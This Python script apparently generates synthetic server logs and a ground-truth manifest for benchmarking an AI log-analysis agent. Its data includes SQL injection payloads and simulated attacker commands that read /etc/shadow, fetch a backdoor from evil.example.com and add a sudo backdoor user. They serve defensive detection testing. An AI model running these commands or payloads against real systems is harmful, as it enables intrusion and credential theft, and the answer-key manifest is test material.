"""
LogSentinel AI — Realistic Log Generator

Generates 500+ realistic server log lines covering:
  - Normal traffic (~60%)
  - Brute force SSH attempts (~10%)
  - Port scanning patterns (~10%)
  - SQL injection attempts in web logs (~10%)
  - Privilege escalation after compromise (~10%)

Each attack scenario is tagged with ground truth metadata
so the benchmark runner can score the agent's detection accuracy.

No API key required — runs entirely offline.

Usage:
    python scripts/generate_logs.py
"""

import json
import os
import random
from datetime import datetime, timedelta, timezone


# ── Configuration ─────────────────────────────────────────────

OUTPUT_DIR = os.path.join(os.path.dirname(__file__), "..", "data", "logs")
MANIFEST_PATH = os.path.join(os.path.dirname(__file__), "..", "data", "benchmark_manifest.json")

# Attacker IPs (consistent across scenarios for cross-log correlation)
ATTACKER_SSH_BRUTE = "203.0.113.42"
ATTACKER_PORT_SCAN = "45.33.32.156"
ATTACKER_SQLI = "198.51.100.77"
ATTACKER_PRIVESC = "203.0.113.42"  # Same IP — brute force succeeded, then escalated

# Legitimate IPs
LEGIT_IPS = [
    "192.168.1.100", "192.168.1.101", "192.168.1.102",
    "10.0.0.5", "10.0.0.10", "10.0.0.15",
    "172.16.0.5", "172.16.0.20", "172.16.0.50",
]

LEGIT_USERS = ["deploy", "ubuntu", "www-data", "jenkins", "nginx"]

# Normal HTTP paths
NORMAL_PATHS = [
    "/", "/index.html", "/about", "/contact", "/dashboard",
    "/api/v1/status", "/api/v1/users", "/api/v1/metrics",
    "/static/style.css", "/static/app.js", "/static/logo.png",
    "/favicon.ico", "/robots.txt", "/sitemap.xml",
    "/blog", "/blog/post-1", "/blog/post-2",
    "/health", "/api/v1/health", "/docs",
]

NORMAL_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
    "curl/7.88.1",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "python-requests/2.31.0",
]

# Scan ports for port scanning scenario
SCAN_PORTS = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3306, 3389, 5432, 5900, 8080, 8443, 9090]

# SQL injection payloads
SQLI_PAYLOADS = [
    "/search?q=1'%20OR%201=1%20--",
    "/search?q=1'%20UNION%20SELECT%20username,password%20FROM%20users--",
    "/login?user=admin'--&pass=x",
    "/api/v1/users?id=1%20OR%201=1",
    "/search?q=1';%20DROP%20TABLE%20users;--",
    "/product?id=1%20UNION%20SELECT%20NULL,NULL,table_name%20FROM%20information_schema.tables--",
    "/search?q=%27%20AND%20(SELECT%20COUNT(*)%20FROM%20users)%3E0--",
    "/api/v1/data?filter=1%20AND%20SLEEP(5)--",
]


# ── Time Management ──────────────────────────────────────────

BASE_TIME = datetime(2026, 6, 15, 2, 0, 0, tzinfo=timezone.utc)


def _jitter(seconds: int = 5) -> timedelta:
    """Random jitter of 0 to N seconds."""
    return timedelta(seconds=random.randint(0, seconds))


def _fmt_apache_ts(dt: datetime) -> str:
    """Format datetime as Apache timestamp: 15/Jun/2026:02:15:23 +0000"""
    return dt.strftime("%d/%b/%Y:%H:%M:%S %z")


def _fmt_auth_ts(dt: datetime) -> str:
    """Format datetime as auth/syslog timestamp: Jun 15 02:15:23"""
    return dt.strftime("%b %d %H:%M:%S")


# ── Apache Log Generators ────────────────────────────────────

def _gen_normal_apache(t: datetime) -> str:
    """Generate a normal Apache access log line."""
    ip = random.choice(LEGIT_IPS)
    path = random.choice(NORMAL_PATHS)
    method = random.choice(["GET"] * 8 + ["POST"] * 2)
    status = random.choice([200] * 15 + [301, 302, 304] * 2 + [404])
    size = random.randint(128, 32768)
    ua = random.choice(NORMAL_USER_AGENTS)
    referer = random.choice(["-", "https://logsentinel.example.com/", "https://example.com/"])
    ts = _fmt_apache_ts(t)
    return f'{ip} - - [{ts}] "{method} {path} HTTP/1.1" {status} {size} "{referer}" "{ua}"'


def _gen_sqli_apache(t: datetime, payload: str) -> str:
    """Generate an SQL injection attempt in Apache logs."""
    ts = _fmt_apache_ts(t)
    # SQLi often triggers 200 (app doesn't block it) or 500 (syntax error in query)
    status = random.choice([200, 200, 500])
    size = random.randint(0, 4096)
    return f'{ATTACKER_SQLI} - - [{ts}] "GET {payload} HTTP/1.1" {status} {size} "-" "sqlmap/1.7.2"'


# ── Auth Log Generators ──────────────────────────────────────

def _gen_normal_auth(t: datetime) -> str:
    """Generate a normal auth log line."""
    ts = _fmt_auth_ts(t)
    event_type = random.choice(["accepted_key", "cron", "sudo_ok"])

    if event_type == "accepted_key":
        user = random.choice(LEGIT_USERS)
        ip = random.choice(LEGIT_IPS)
        port = random.randint(40000, 65000)
        pid = random.randint(10000, 30000)
        return f"{ts} server1 sshd[{pid}]: Accepted publickey for {user} from {ip} port {port} ssh2"
    elif event_type == "cron":
        pid = random.randint(10000, 30000)
        return f"{ts} server1 CRON[{pid}]: (root) CMD (/usr/bin/logrotate /etc/logrotate.conf)"
    else:
        user = random.choice(LEGIT_USERS)
        cmd = random.choice([
            "/usr/bin/apt update",
            "/usr/bin/systemctl status nginx",
            "/usr/bin/journalctl -u postgresql",
            "/usr/bin/df -h",
        ])
        return f"{ts} server1 sudo: {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND={cmd}"


def _gen_brute_force_failed(t: datetime, pid_base: int) -> str:
    """Generate a failed SSH password attempt from the brute force attacker."""
    ts = _fmt_auth_ts(t)
    port = random.randint(48000, 50000)
    return f"{ts} server1 sshd[{pid_base}]: Failed password for root from {ATTACKER_SSH_BRUTE} port {port} ssh2"


def _gen_brute_force_success(t: datetime) -> str:
    """Generate a successful SSH login after brute force."""
    ts = _fmt_auth_ts(t)
    port = random.randint(48000, 50000)
    return f"{ts} server1 sshd[12999]: Accepted password for root from {ATTACKER_SSH_BRUTE} port {port} ssh2"


def _gen_privesc(t: datetime, command: str) -> str:
    """Generate a privilege escalation command."""
    ts = _fmt_auth_ts(t)
    return f"{ts} server1 sudo: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND={command}"


# ── Syslog Generators ────────────────────────────────────────

def _gen_normal_syslog(t: datetime) -> str:
    """Generate a normal syslog line."""
    ts = _fmt_auth_ts(t)
    event_type = random.choice(["kernel", "systemd", "cron", "dhcp", "network"])

    if event_type == "kernel":
        uptime = random.randint(100, 999999)
        return f"{ts} server1 kernel: [{uptime:>10}.{random.randint(100000,999999)}] eth0: link up, 1000 Mbps"
    elif event_type == "systemd":
        service = random.choice(["nginx", "postgresql", "redis-server", "cron", "docker"])
        action = random.choice(["Started", "Starting", "Reloading"])
        return f"{ts} server1 systemd[1]: {action} {service}.service."
    elif event_type == "cron":
        pid = random.randint(5000, 9000)
        return f"{ts} server1 cron[{pid}]: (root) CMD (/usr/bin/logrotate /etc/logrotate.conf)"
    elif event_type == "dhcp":
        pid = random.randint(800, 1200)
        return f"{ts} server1 dhclient[{pid}]: DHCPREQUEST on eth0 to 192.168.1.1 port 67"
    else:
        uptime = random.randint(100, 999999)
        return f"{ts} server1 kernel: [{uptime:>10}.{random.randint(100000,999999)}] device eth0 entered promiscuous mode"


def _gen_port_scan_block(t: datetime, dst_port: int) -> str:
    """Generate a UFW BLOCK entry for port scanning."""
    ts = _fmt_auth_ts(t)
    src_port = random.randint(10000, 60000)
    return (
        f"{ts} server1 ufw[8000]: [UFW BLOCK] IN=eth0 OUT= "
        f"SRC={ATTACKER_PORT_SCAN} DST=192.168.1.10 "
        f"PROTO=TCP SPT={src_port} DPT={dst_port}"
    )


def _gen_syn_flood(t: datetime) -> str:
    """Generate a SYN flood warning in kernel logs."""
    ts = _fmt_auth_ts(t)
    uptime = random.randint(200, 500)
    return f"{ts} server1 kernel: [{uptime:>10}.{random.randint(100000,999999)}] TCP: request_sock_TCP: Possible SYN flooding on port 80. Sending cookies."


def _gen_oom_kill(t: datetime) -> str:
    """Generate an out-of-memory kill event."""
    ts = _fmt_auth_ts(t)
    uptime = random.randint(300, 600)
    pid = random.randint(10000, 20000)
    return f"{ts} server1 kernel: [{uptime:>10}.{random.randint(100000,999999)}] Out of memory: Killed process {pid} (java) total-vm:4096000kB"


# ── Main Generator ────────────────────────────────────────────

def generate_all_logs() -> dict:
    """Generate all benchmark log files and return the ground truth manifest.

    Returns:
        Dictionary containing the ground truth manifest with planted attack details.
    """
    random.seed(42)  # Reproducible output

    apache_lines: list[str] = []
    auth_lines: list[str] = []
    syslog_lines: list[str] = []

    t = BASE_TIME

    # ── Phase 1: Normal baseline traffic (02:00 – 02:15) ──────
    # ~140 lines of clean traffic to establish a baseline
    for _ in range(60):
        apache_lines.append(_gen_normal_apache(t + _jitter(60)))
    for _ in range(40):
        auth_lines.append(_gen_normal_auth(t + _jitter(60)))
    for _ in range(40):
        syslog_lines.append(_gen_normal_syslog(t + _jitter(60)))

    t += timedelta(minutes=15)

    # ── Phase 2: Brute force SSH attack (02:15 – 02:20) ───────
    # 20 rapid failed password attempts, then success
    brute_start = t
    pid_base = 12400
    for i in range(20):
        auth_lines.append(_gen_brute_force_failed(
            brute_start + timedelta(seconds=i * 3),
            pid_base + i,
        ))

    # Success after 60 seconds of trying
    brute_success_time = brute_start + timedelta(seconds=65)
    auth_lines.append(_gen_brute_force_success(brute_success_time))

    # Intersperse some normal traffic during brute force
    for _ in range(15):
        apache_lines.append(_gen_normal_apache(t + _jitter(120)))
    for _ in range(10):
        auth_lines.append(_gen_normal_auth(t + _jitter(120)))
    for _ in range(10):
        syslog_lines.append(_gen_normal_syslog(t + _jitter(120)))

    t += timedelta(minutes=10)

    # ── Phase 3: Privilege escalation (02:25 – 02:30) ─────────
    # After brute force success, attacker reads /etc/shadow, installs tools
    privesc_commands = [
        "/bin/cat /etc/shadow",
        "/bin/cat /etc/passwd",
        "/usr/bin/wget http://evil.example.com/backdoor.sh",
        "/bin/chmod +x /tmp/backdoor.sh",
        "/usr/bin/useradd -m -s /bin/bash backdoor_user",
        "/usr/sbin/usermod -aG sudo backdoor_user",
    ]
    privesc_start = t
    for i, cmd in enumerate(privesc_commands):
        auth_lines.append(_gen_privesc(
            privesc_start + timedelta(seconds=i * 10),
            cmd,
        ))

    # Also su to www-data to pivot
    su_time = privesc_start + timedelta(seconds=70)
    ts = _fmt_auth_ts(su_time)
    auth_lines.append(f"{ts} server1 su[13000]: Successful su for www-data by root")

    # Normal traffic continues
    for _ in range(20):
        apache_lines.append(_gen_normal_apache(t + _jitter(120)))
    for _ in range(10):
        auth_lines.append(_gen_normal_auth(t + _jitter(120)))
    for _ in range(10):
        syslog_lines.append(_gen_normal_syslog(t + _jitter(120)))

    t += timedelta(minutes=10)

    # ── Phase 4: Port scanning (02:35 – 02:40) ───────────────
    scan_start = t
    for i, port in enumerate(SCAN_PORTS):
        syslog_lines.append(_gen_port_scan_block(
            scan_start + timedelta(seconds=i * 2),
            port,
        ))

    # SYN flood warning triggered by the scan volume
    syslog_lines.append(_gen_syn_flood(scan_start + timedelta(seconds=len(SCAN_PORTS) * 2 + 5)))

    # Normal traffic continues
    for _ in range(20):
        apache_lines.append(_gen_normal_apache(t + _jitter(120)))
    for _ in range(10):
        auth_lines.append(_gen_normal_auth(t + _jitter(120)))

    t += timedelta(minutes=10)

    # ── Phase 5: SQL injection attack (02:45 – 02:50) ─────────
    sqli_start = t
    for i, payload in enumerate(SQLI_PAYLOADS):
        apache_lines.append(_gen_sqli_apache(
            sqli_start + timedelta(seconds=i * 5),
            payload,
        ))

    # Normal traffic interspersed
    for _ in range(25):
        apache_lines.append(_gen_normal_apache(t + _jitter(120)))
    for _ in range(12):
        auth_lines.append(_gen_normal_auth(t + _jitter(120)))
    for _ in range(12):
        syslog_lines.append(_gen_normal_syslog(t + _jitter(120)))

    t += timedelta(minutes=10)

    # ── Phase 6: Cool-down — normal traffic only (02:55 – 03:15) ──
    for _ in range(75):
        apache_lines.append(_gen_normal_apache(t + _jitter(300)))
    for _ in range(40):
        auth_lines.append(_gen_normal_auth(t + _jitter(300)))
    for _ in range(40):
        syslog_lines.append(_gen_normal_syslog(t + _jitter(300)))

    # ── Sort all lines by timestamp for realism ───────────────
    # Apache lines are already roughly ordered but let's be precise
    # Auth/syslog lines use the same timestamp prefix format

    # ── Write output files ────────────────────────────────────
    os.makedirs(OUTPUT_DIR, exist_ok=True)

    apache_path = os.path.join(OUTPUT_DIR, "benchmark_apache.log")
    auth_path = os.path.join(OUTPUT_DIR, "benchmark_auth.log")
    syslog_path = os.path.join(OUTPUT_DIR, "benchmark_syslog.log")

    with open(apache_path, "w", encoding="utf-8") as f:
        f.write("\n".join(apache_lines) + "\n")

    with open(auth_path, "w", encoding="utf-8") as f:
        f.write("\n".join(auth_lines) + "\n")

    with open(syslog_path, "w", encoding="utf-8") as f:
        f.write("\n".join(syslog_lines) + "\n")

    # ── Ground truth manifest ─────────────────────────────────
    manifest = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "total_lines": {
            "apache": len(apache_lines),
            "auth": len(auth_lines),
            "syslog": len(syslog_lines),
            "total": len(apache_lines) + len(auth_lines) + len(syslog_lines),
        },
        "output_files": {
            "apache": apache_path,
            "auth": auth_path,
            "syslog": syslog_path,
        },
        "planted_attacks": [
            {
                "id": "brute_force_ssh",
                "type": "Brute Force SSH Attack",
                "description": "20 rapid failed SSH password attempts against root, followed by successful login",
                "attacker_ip": ATTACKER_SSH_BRUTE,
                "expected_severity": "CRITICAL",
                "log_sources": ["auth"],
                "time_window": f"{_fmt_auth_ts(brute_start)} - {_fmt_auth_ts(brute_success_time)}",
                "indicators": [
                    "20 failed password attempts for root",
                    f"All from IP {ATTACKER_SSH_BRUTE}",
                    "Successful login after failures",
                ],
            },
            {
                "id": "privilege_escalation",
                "type": "Privilege Escalation",
                "description": "After SSH brute force success, attacker reads /etc/shadow, creates backdoor user, downloads malware",
                "attacker_ip": ATTACKER_PRIVESC,
                "expected_severity": "CRITICAL",
                "log_sources": ["auth"],
                "time_window": f"{_fmt_auth_ts(privesc_start)} - {_fmt_auth_ts(su_time)}",
                "indicators": [
                    "cat /etc/shadow",
                    "wget backdoor",
                    "useradd backdoor_user",
                    "usermod -aG sudo",
                    "su for www-data by root",
                ],
            },
            {
                "id": "port_scanning",
                "type": "Port Scanning",
                "description": f"Sequential port scan from {ATTACKER_PORT_SCAN} hitting {len(SCAN_PORTS)} ports, triggering SYN flood warning",
                "attacker_ip": ATTACKER_PORT_SCAN,
                "expected_severity": "MEDIUM",
                "log_sources": ["syslog"],
                "time_window": f"{_fmt_auth_ts(scan_start)} - {_fmt_auth_ts(scan_start + timedelta(seconds=len(SCAN_PORTS) * 2 + 10))}",
                "indicators": [
                    f"{len(SCAN_PORTS)} UFW BLOCK entries from same IP",
                    "Sequential port numbers",
                    "SYN flood warning",
                ],
            },
            {
                "id": "sql_injection",
                "type": "SQL Injection Attempt",
                "description": f"Automated SQL injection scan from {ATTACKER_SQLI} using sqlmap with {len(SQLI_PAYLOADS)} payloads",
                "attacker_ip": ATTACKER_SQLI,
                "expected_severity": "HIGH",
                "log_sources": ["apache"],
                "time_window": f"{_fmt_apache_ts(sqli_start)} - {_fmt_apache_ts(sqli_start + timedelta(seconds=len(SQLI_PAYLOADS) * 5))}",
                "indicators": [
                    "sqlmap user-agent",
                    "UNION SELECT in query strings",
                    "OR 1=1 in query strings",
                    "DROP TABLE in query strings",
                    "500 status codes from injection payloads",
                ],
            },
        ],
    }

    with open(MANIFEST_PATH, "w", encoding="utf-8") as f:
        json.dump(manifest, f, indent=2)

    return manifest


# ── CLI Entry Point ───────────────────────────────────────────

if __name__ == "__main__":
    print("=" * 60)
    print("LogSentinel AI — Benchmark Log Generator")
    print("=" * 60)

    manifest = generate_all_logs()

    print(f"\n[OK] Generated {manifest['total_lines']['total']} log lines:")
    print(f"   Apache:  {manifest['total_lines']['apache']} lines")
    print(f"   Auth:    {manifest['total_lines']['auth']} lines")
    print(f"   Syslog:  {manifest['total_lines']['syslog']} lines")
    print(f"\n[FILES] Output files:")
    for fmt, path in manifest["output_files"].items():
        print(f"   {fmt}: {path}")
    print(f"\n[ATTACKS] Planted {len(manifest['planted_attacks'])} attack scenarios:")
    for attack in manifest["planted_attacks"]:
        print(f"   [{attack['expected_severity']:>8}] {attack['type']}")
        print(f"            Attacker: {attack['attacker_ip']}")
        print(f"            Sources:  {', '.join(attack['log_sources'])}")
    print(f"\n[MANIFEST] {MANIFEST_PATH}")
    print("=" * 60)
